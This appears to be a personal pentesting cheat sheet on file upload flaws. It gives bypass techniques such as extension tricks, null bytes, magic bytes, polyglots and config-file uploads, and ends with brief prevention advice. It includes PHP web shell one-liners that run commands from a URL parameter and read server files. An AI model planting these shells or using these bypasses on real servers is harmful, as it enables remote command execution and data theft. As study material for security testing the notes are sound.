# file upload
when files are uploaded
and not checked

its possible to upload fe a webshell
and then acces the webshell

## uploads
<?php echo file_get_contents('/path/to/target/file'); ?>

<?php echo system($_GET['command']); ?>
xample/exploit.php?command=id HTTP/1.1

## formdata
sometimes it only checks if a content type is image/png or something
you can ez do it in burpsuite
or with js see "script/file_upload_blob.js" you could just execute this in console

## path traversal
sometimes using path traversal techniques can be used in the filename

## extensions
or filename extension of lesser known could be used
.php5
.shtml

## server side preventions
some config files are used to prevent access or execution of certain files
these might be interesting to try to retrieve if possible 
if we can upload these than we can even let files we are able to upload fe allow php to work

web.config:
`<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers>
            <!-- Add handler to process PHP files -->
            <add name="PHP-FastCGI" path="*.php" verb="*" modules="FastCgiModule" scriptProcessor="C:\path\to\php\php-cgi.exe" resourceType="Either" requireAccess="Script" />
        </handlers>
    </system.webServer>
</configuration>`


.htaccess:
`AddHandler application/x-httpd-php .php`

## file name obfuscation
using multiple extensions
.php.jpg

trailing characters
.php.

encoding
%2Ephp

null byte characters maybe with encoding
.php;.jpg
.php%00.jpg

if replacing things and its not recursive
.ph.phpp

## filecontent
might be that a server will get the widht en height of image,
ofc with a script its not possible

or first bytes of a file need to be those of a image format
then magicbytes can be added in the beginning of a script to bypass this
jpeg: FF D8 FF

## polyglot
using exiftool trivial malicious code could be stored in a jpgs metadata
or just at the end of the file see "script/file_upload_polyglot.sh"

## put
sometimes other requests are excepted and not only GET or POST
fe PUT, OPTIONS

## prevention
splitting on . of the filename and checking against a whitelist
if removing dissalowed extensions do it recursively
making sure directeroy traversal cant be used: ../
renaming uploaded files
only allow scanned files to be uploaded
dont write this yourself, use established technologys

